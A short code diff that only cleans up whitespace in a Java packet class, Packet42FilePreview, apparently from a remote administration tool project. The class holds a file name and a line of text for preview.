@@ -4,12 +4,11 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet42FilePreview extends AbstractOutgoingPacket {
-	
+
 	private String file;
 	private String line;
-	
+
 	public Packet42FilePreview(String file, String line) {
 		this.file = file;
 		this.line = line;
